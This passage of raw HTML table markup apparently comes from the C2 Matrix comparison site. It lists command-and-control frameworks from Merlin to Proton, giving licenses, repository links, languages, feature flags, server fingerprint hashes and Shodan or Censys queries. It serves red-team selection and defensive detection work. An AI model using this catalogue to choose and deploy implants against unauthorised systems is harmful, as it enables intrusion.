href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>Merlin</td><td>GNU GPL3</td><td>NA</td><td><a href="https://github.com/Ne0nd0g/merlin">https://github.com/Ne0nd0g/merlin</a></td><td><a href="https://merlin-c2.readthedocs.io/en/latest/">https://merlin-c2.readthedocs.io/en/latest/</a></td><td>@merlin_c2</td><td>@jorgeorchilles</td><td>11&#x2F;4&#x2F;2019</td><td>0.8.0</td><td>Binary</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Go</td><td>Go</td><td>No</td><td>CLI</td><td></td><td>No</td><td>Yes</td><td>Yes</td><td>Yes</td><td></td><td></td><td>No</td><td>Yes</td><td>Yes</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td></td><td>aPAKE OPAQUE</td><td>No</td><td>No</td><td>Yes</td><td>No</td><td>Yes</td><td>No</td><td>Yes</td><td>No</td><td>Yes</td><td>No</td><td></td><td>No</td><td>Yes</td><td></td><td></td><td></td><td></td><td>29d21b20d29d29d21c41d21b21b41d494e0df9532e75299f15ba73156cee38</td><td></td><td>Yes</td><td>#merlin bloodhoundhq.slack.com</td><td>278</td><td>57</td><td><a href="https://github.com/r00t0v3rr1d3/merlin/tree/dev">Gandalf: https://github.com/r00t0v3rr1d3/merlin/tree/dev</a></td></tr><tr><td>Metasploit</td><td>BSD3</td><td>NA</td><td><a href="https://github.com/rapid7/metasploit-framework">https://github.com/rapid7/metasploit-framework</a></td><td><a href="https://metasploit.com/">https://metasploit.com</a></td><td>@metasploit</td><td>@busterbcook</td><td>12&#x2F;4&#x2F;2019</td><td>5.0.62</td><td>Ruby</td><td></td><td></td><td></td><td>Ruby</td><td>C&#x2F;Java&#x2F;PHP&#x2F;Python</td><td>Yes</td><td>CLI</td><td></td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td></td><td></td><td>Yes</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>Yes</td><td></td><td>RSA</td><td>No</td><td>Yes</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>No</td><td>Yes</td><td>Yes</td><td>No</td><td></td><td>No</td><td>Yes</td><td></td><td></td><td>Yes</td><td></td><td>07d14d16d21d21d00042d43d000000aa99ce74e2c6d013c745aa52b5cc042d</td><td><a href="https://www.shodan.io/search?query=ssl:%22MetasploitSelfSignedCA%22">Yes</a></td><td>Yes</td><td>metasploit.slack.com</td><td>4653</td><td>3953</td><td></td></tr><tr><td>Meteor</td><td>GNU GPL3</td><td>NA</td><td><a href="https://github.com/degenerat3/meteor">https://github.com/degenerat3/meteor</a></td><td></td><td></td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>Meterpeter</td><td>NA</td><td>NA</td><td><a href="https://github.com/r00t-3xp10it/meterpeter">https://github.com/r00t-3xp10it/meterpeter</a></td><td></td><td></td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>No</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>Yes</td><td>No</td><td>NA</td><td>0</td><td></td></tr><tr><td>MicroBackdoor</td><td>GNU GPL3</td><td>NA</td><td><a href="https://github.com/Cr4sh/MicroBackdoor">https://github.com/Cr4sh/MicroBackdoor</a></td><td></td><td>@d_olex</td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>MikeC2</td><td>MIT</td><td>NA</td><td><a href="https://github.com/mlgualtieri/PurpleTeamSummit/tree/main/Summit-May2021">https://github.com/mlgualtieri/PurpleTeamSummit/tree/main/Summit-May2021</a></td><td></td><td>@mlgualtieri</td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td>5&#x2F;25&#x2F;2021</td><td></td><td>C# &#x2F; PHP</td><td>No</td><td>No</td><td>No</td><td>PHP</td><td>C#</td><td>No</td><td>CLI</td><td>No</td><td>No</td><td>Yes</td><td>No</td><td>No</td><td></td><td></td><td>Yes</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td></td><td>No</td><td>No</td><td>No</td><td>No</td><td>Yes</td><td>No</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td></td><td></td><td></td><td>No</td><td></td><td>No</td><td></td><td>No</td><td>No</td><td></td><td></td><td>The MikeC2 agent is best loaded with MikeDrop</td></tr><tr><td>MiniC2</td><td>NA</td><td>NA</td><td><a href="https://github.com/RickConsole/minic2">https://github.com/RickConsole/minic2</a></td><td></td><td>@ConsoleRick</td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>Mistica</td><td>GNU GPL3</td><td>NA</td><td><a href="https://github.com/IncideDigital/Mistica">https://github.com/IncideDigital/Mistica</a></td><td></td><td></td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>Mythic</td><td>BSD3</td><td>NA</td><td><a href="https://github.com/its-a-feature/Mythic">https://github.com/its-a-feature/Mythic</a></td><td><a href="https://docs.mythic-c2.net/">https://docs.mythic-c2.net/</a></td><td>@its_a_feature_</td><td>@jorgeorchilles</td><td>10&#x2F;6&#x2F;2019</td><td>1.3</td><td>Docker</td><td><a href="https://howto.thec2matrix.com/c2/mythic">Yes</a></td><td></td><td></td><td>Python</td><td>N&#x2F;A (Mythic is the handler&#x2F;controller, not the implant)</td><td>Yes</td><td>Web</td><td></td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td></td><td></td><td>No</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td></td><td>Encrypted Key Exchange</td><td>No</td><td>No</td><td>Yes</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>No</td><td>Yes</td><td>No</td><td></td><td>Yes</td><td></td><td></td><td></td><td></td><td></td><td>2ad2ad0002ad2ad00042d42d000000ad9bf51cc3f5a1e29eecb81d0c7b06eb</td><td><a href="https://www.shodan.io/search?query=ssl:Mythic+port:7443">Yes</a></td><td>Yes</td><td>#ApFell bloodhoundgang.herokuapp.com</td><td>180</td><td>14</td><td></td></tr><tr><td>Mythic-Apollo</td><td>BSD3</td><td>NA</td><td><a href="https://github.com/MythicAgents/Apollo">https://github.com/MythicAgents/Apollo</a></td><td></td><td>@djhohnstein</td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>.NET</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>Yes</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>Implant for Mythic</td></tr><tr><td>Mythic-Medusa</td><td>NA</td><td>NA</td><td><a href="https://github.com/MythicAgents/Medusa">https://github.com/MythicAgents/Medusa</a></td><td></td><td>@ajpc500</td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>Python</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>Yes</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>NamelessC2</td><td>GNU GPL3</td><td>NA</td><td><a href="https://github.com/trickster0/NamelessC2">https://github.com/trickster0/NamelessC2</a></td><td></td><td>@trickster012</td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>Nebula</td><td>MIT</td><td>NA</td><td><a href="https://github.com/gl4ssesbo1/Nebula">https://github.com/gl4ssesbo1/Nebula</a></td><td></td><td></td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>Nighthawk</td><td>Commercial</td><td>£22,500</td><td></td><td><a href="https://www.mdsec.co.uk/nighthawk/">https://www.mdsec.co.uk/nighthawk/</a></td><td>@MDSecLabs</td><td>@domchell</td><td>12&#x2F;16&#x2F;2021</td><td>0.1</td><td>Binary</td><td></td><td></td><td></td><td>Python</td><td>C++</td><td>Yes</td><td>GUI</td><td>No</td><td>Yes</td><td>Yes</td><td>No</td><td>No</td><td></td><td></td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td>No</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td>No</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td>No</td><td>Yes</td><td>Yes</td><td></td><td></td><td>No</td><td></td><td></td><td></td><td>Yes</td><td>Yes</td><td>NA</td><td>NA</td><td></td></tr><tr><td>Nightmangle</td><td>NA</td><td>NA</td><td><a href="https://github.com/1N73LL1G3NC3x/Nightmangle">https://github.com/1N73LL1G3NC3x/Nightmangle</a></td><td></td><td></td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>Nimbo-C2</td><td>MIT</td><td>NA</td><td><a href="https://github.com/itaymigdal/Nimbo-C2">https://github.com/itaymigdal/Nimbo-C2</a></td><td></td><td></td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td>Python</td><td>Nim</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>Nimplant</td><td>MIT</td><td>NA</td><td><a href="https://github.com/chvancooten/NimPlant/blob/main/LICENSE">https://github.com/chvancooten/NimPlant/blob/main/LICENSE</a></td><td></td><td></td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td><a href="https://search.censys.io/search?resource=hosts&sort=RELEVANCE&per_page=25&virtual_hosts=EXCLUDE&q=96832ad2ed44cb8a072ae603b56ce4d323ff5889">Yes</a></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>Ninja</td><td>GNU GPL3</td><td>NA</td><td><a href="https://github.com/ahmedkhlief/Ninja/">https://github.com/ahmedkhlief/Ninja/</a></td><td><a href="https://shells.systems/introducing-ninja-c2-the-c2-built-for-stealth-red-team-operations/">https://shells.systems/introducing-ninja-c2-the-c2-built-for-stealth-red-team-operations/</a></td><td></td><td>@leekirkpatrick4</td><td>4&#x2F;3&#x2F;2020</td><td>Beta</td><td>python</td><td></td><td></td><td></td><td>Python</td><td>C#&#x2F;PowerShell</td><td>Yes</td><td>CLI</td><td></td><td>No</td><td>Yes</td><td>No</td><td>No</td><td></td><td></td><td>No</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td></td><td>AES</td><td>No</td><td>Yes</td><td>No</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>No</td><td>Yes</td><td>No</td><td></td><td>No</td><td></td><td></td><td></td><td>Yes</td><td></td><td></td><td></td><td>Yes</td><td>No</td><td>NA</td><td>4</td><td>Built on top of leaked MuddyC3</td></tr><tr><td>NorthStarC2</td><td>GNU GPL3</td><td>NA</td><td><a href="https://github.com/EnginDemirbilek/NorthStarC2">https://github.com/EnginDemirbilek/NorthStarC2</a></td><td></td><td></td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>Nuages</td><td>NA</td><td>NA</td><td><a href="https://github.com/p3nt4/Nuages">https://github.com/p3nt4/Nuages</a></td><td></td><td>@xp3nt4</td><td>@xp3nt4</td><td>11&#x2F;12&#x2F;2019</td><td>1</td><td><a href="http://setup.sh/">Node.Js</a></td><td><a href="https://howto.thec2matrix.com/c2/nuages">Yes</a></td><td></td><td></td><td>Python</td><td>C#</td><td>Yes</td><td>Cli</td><td></td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td></td><td></td><td>No</td><td>Yes</td><td>No</td><td>No</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td></td><td>AES</td><td>No</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td></td><td>No</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>Yes</td><td>No</td><td>NA</td><td>0</td><td>Implants can be built and customized easily</td></tr><tr><td>Octopus</td><td>GNU GPL3</td><td>NA</td><td><a href="https://github.com/mhaskar/Octopus">https://github.com/mhaskar/Octopus</a></td><td><a href="https://shells.systems/unveiling-octopus-the-pre-operation-c2-for-red-teamers/">https://shells.systems/unveiling-octopus-the-pre-operation-c2-for-red-teamers/</a></td><td>@mohammadaskar2</td><td>@jorgeorchilles</td><td>12&#x2F;12&#x2F;2019</td><td>v1.0 Beta</td><td>pip3</td><td></td><td></td><td></td><td>Python</td><td>PowerShell</td><td>No</td><td>GUI</td><td></td><td>No</td><td>Yes</td><td>No</td><td>No</td><td></td><td></td><td>No</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td></td><td>AES</td><td>No</td><td>No</td><td>No</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>Yes</td><td>Yes</td><td>No</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>Yes</td><td>No</td><td>NA</td><td>3</td><td></td></tr><tr><td>OffensiveNotion</td><td>MIT</td><td>NA</td><td><a href="https://github.com/mttaggart/OffensiveNotion">https://github.com/mttaggart/OffensiveNotion</a></td><td></td><td>@mttaggart @huskyhacksmk</td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>OST Outflank C2</td><td>Commercial</td><td>Check Site</td><td></td><td><a href="https://www.outflank.nl/products/outflank-security-tooling/">https://www.outflank.nl/products/outflank-security-tooling/</a></td><td>@OutflankNL</td><td>@DaWouw</td><td>08&#x2F;13&#x2F;2024</td><td></td><td>Docker</td><td></td><td></td><td></td><td>Python</td><td>C++</td><td>Yes</td><td>Web</td><td></td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td></td><td></td><td>Yes</td><td>Yes</td><td>Yes</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>Yes</td><td></td><td>Yes</td><td></td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td></td><td>Yes</td><td>Yes</td><td>Yes</td><td></td><td>Yes</td><td>Yes</td><td>Yes</td><td></td><td>Yes</td><td></td><td></td><td></td><td></td><td>Yes</td><td>Yes, private</td><td></td><td></td><td>Available as part of larger Outflank Security Tooling (OST) offering with multiple initial access and post-ex capabilities</td></tr><tr><td>Oyabun C2</td><td>Commercial</td><td>$200</td><td></td><td><a href="https://redcodelabs.io/oyabun/">https://redcodelabs.io/oyabun/</a></td><td>@redcode_labs</td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td>Go</td><td>Go</td><td>No</td><td>CLI</td><td></td><td>No</td><td>Yes</td><td>Yes</td><td>Yes</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>Palinka</td><td>NA</td><td>NA</td><td><a href="https://github.com/lapolis/palinka_c2">https://github.com/lapolis/palinka_c2</a></td><td></td><td>@l4p0lis</td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>Periscope</td><td>Custom</td><td>NA</td><td><a href="https://github.com/malcomvetter/Periscope">DMCA takedown</a></td><td></td><td>@malcomvetter</td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>PetaQ</td><td>MIT</td><td>NA</td><td><a href="https://github.com/fozavci/petaqc2">https://github.com/fozavci/petaqc2</a></td><td><a href="https://github.com/github/dmca/blob/master/2023/09/2023-09-26-walmart.md">https://github.com/github/dmca/blob/master/2023/09/2023-09-26-walmart.md</a></td><td></td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>PhoenixC2</td><td>BSD3</td><td>NA</td><td><a href="https://github.com/screamz2k/PhoenixC2">https://github.com/screamz2k/PhoenixC2</a></td><td><a href="https://phoenixc2.com/">https://phoenixc2.com/</a></td><td>@screamz2k</td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>PickleC2</td><td>NA</td><td>NA</td><td><a href="https://github.com/xRET2pwn/PickleC2">https://github.com/xRET2pwn/PickleC2</a></td><td><a href="https://picklec2.readthedocs.io/en/latest/">https://picklec2.readthedocs.io/en/latest/</a></td><td>@RET2_pwn</td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td>Python</td><td>PowerShell</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>PoshC2</td><td>BSD3</td><td>NA</td><td><a href="https://github.com/nettitude/PoshC2/">https://github.com/nettitude/PoshC2/</a></td><td><a href="https://poshc2.readthedocs.io/en/latest/">https://poshc2.readthedocs.io/en/latest/</a></td><td>@Nettitude_Labs</td><td>@jorgeorchilles</td><td>9&#x2F;11&#x2F;2021</td><td>7.4.0</td><td><a href="http://install.sh/">install.sh</a></td><td><a href="https://howto.thec2matrix.com/c2/poshc2">Yes</a></td><td>Yes</td><td>Yes</td><td>Python</td><td>PowerShell&#x2F;C#&#x2F;Python</td><td>Yes</td><td>CLI</td><td>Yes</td><td>No</td><td>Yes</td><td>Yes</td><td>Yes</td><td></td><td></td><td>No</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>Yes</td><td></td><td>TLS</td><td>No</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td>No</td><td></td><td></td><td>Yes</td><td><a href="https://community.rsa.com/community/products/netwitness/blog/2019/12/02/using-rsa-netwitness-to-detect-command-and-control-poshc2-v50">Yes</a></td><td></td><td>2ad2ad0002ad2ad22c42d42d000000faabb8fd156aa8b4d8a37853e1063261</td><td><a href="https://www.shodan.io/search?query=ssl:%22P18055077%22">Yes</a></td><td>Yes</td><td><a href="http://poshc2.slack.com/">poshc2.slack.com</a></td><td><a href="https://labs.nettitude.com/blog/detecting-poshc2-indicators-of-compromise/">https://labs.nettitude.com/blog/detecting-poshc2-indicators-of-compromise/</a></td><td>44</td><td><a href="https://labs.nettitude.com/blog/detecting-poshc2-indicators-of-compromise/">https://labs.nettitude.com/blog/detecting-poshc2-indicators-of-compromise/</a></td></tr><tr><td>PowerHub</td><td>MIT</td><td>NA</td><td><a href="https://github.com/AdrianVollmer/PowerHub">https://github.com/AdrianVollmer/PowerHub</a></td><td></td><td>@mr_mitm</td><td>@jorgeorchilles</td><td>11&#x2F;15&#x2F;2019</td><td>1.3</td><td>pip3</td><td>Yes</td><td></td><td>Yes</td><td>Python</td><td>PowerShell</td><td>Yes</td><td>Web</td><td></td><td>No</td><td>Yes</td><td>No</td><td>No</td><td></td><td></td><td>No</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td></td><td>TLS</td><td>No</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>Yes</td><td>No</td><td></td><td>No</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>Yes</td><td>No</td><td>NA</td><td>38</td><td></td></tr><tr><td>Prelude</td><td>Commercial</td><td>Check Site</td><td><a href="https://github.com/preludeorg/operator-support">https://github.com/preludeorg/</a></td><td><a href="https://www.prelude.org/">https://www.prelude.org/</a></td><td>@preludeorg</td><td>@bfuzzy1</td><td>1&#x2F;15&#x2F;2021</td><td>0.9.12</td><td>Binary</td><td>No</td><td>No</td><td>No</td><td>NodeJS</td><td>Go&#x2F;Python&#x2F;JS</td><td>No</td><td>GUI</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td></td><td></td><td>Yes</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>Pre-shared key&#x2F;TLS</td><td>No</td><td>No</td><td>No</td><td>No</td><td>Yes</td><td>Yes</td><td>No</td><td>Yes</td><td>Yes</td><td>No</td><td>Yes</td><td>Yes</td><td></td><td></td><td></td><td>No</td><td></td><td>No</td><td></td><td>Yes</td><td>No</td><td>N&#x2F;A</td><td>6</td><td>Community is free, Professional $50 per user, Enterprise $1,000 a month up to 10 users</td></tr><tr><td>Prismatica</td><td>MIT</td><td>NA</td><td><a href="https://github.com/Project-Prismatica">https://github.com/Project-Prismatica</a></td><td><a href="http://prismatica.io/">http://prismatica.io/</a></td><td>@PPrismatica</td><td>@0sm0s1z</td><td>11&#x2F;13&#x2F;2019</td><td>0.01</td><td>Docker</td><td></td><td></td><td></td><td>Javascript&#x2F;Python</td><td>JScript&#x2F;.NET&#x2F;Rust</td><td>Yes</td><td>GUI</td><td></td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td></td><td></td><td>Yes</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td>No</td><td></td><td>None</td><td>No</td><td>Yes</td><td>No</td><td>Yes</td><td>Yes</td><td>No</td><td>No</td><td>Yes</td><td>Yes</td><td>No</td><td></td><td>Yes</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>Yes</td><td>No</td><td>NA</td><td>1</td><td></td></tr><tr><td>Proton</td><td>GNU GPL3</td><td>NA</td><td><a href="https://github.com/entynetproject/proton">https://github.com/entynetproject/proton</a></td><td></td><td>@enty8080</td><td><a href="https://howto.thec2matrix.com/contribute">Contribute</a></td><td></td><td>5</td><td><a 